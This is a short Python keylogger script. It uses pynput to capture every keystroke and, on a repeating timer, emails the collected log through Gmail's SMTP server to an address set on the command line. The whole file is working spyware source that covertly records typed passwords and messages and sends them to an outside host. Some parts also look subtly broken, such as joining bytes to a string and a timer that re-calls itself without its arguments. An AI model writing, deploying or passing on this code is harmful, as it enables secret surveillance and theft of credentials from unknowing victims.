import pynput.keyboard
import smtplib
import threading
import optparse

log = ""

def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-e","--email",dest="email",help="Enter the email address where the stored log will be delivered to you.",nargs=1)
    parse_object.add_option("-p","--password",dest="password",help="Enter the password for the email address you have given.",nargs=1)
    parse_object.add_option("-t","--time",dest="time",help="Enter how many seconds the stored records will be sent to you. By default, it will be sent every 30 seconds.")

    return parse_object.parse_args()


def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)

    print(log)

def send_email(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(email,password)
    email_server.sendmail(email,email,message)
    email_server.quit()

# thread - threading

def thread_function(email,password,time=30):
    global log
    send_email(email, password, log)
    log = ""
    timer_object = threading.Timer(time,thread_function)
    timer_object.start()

(user_input,arguments) = get_user_input()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    if user_input.time == None:
        thread_function(user_input.email,user_input.password)
    else:
        thread_function(user_input.email, user_input.password, user_input.time)

    keylogger_listener.join()



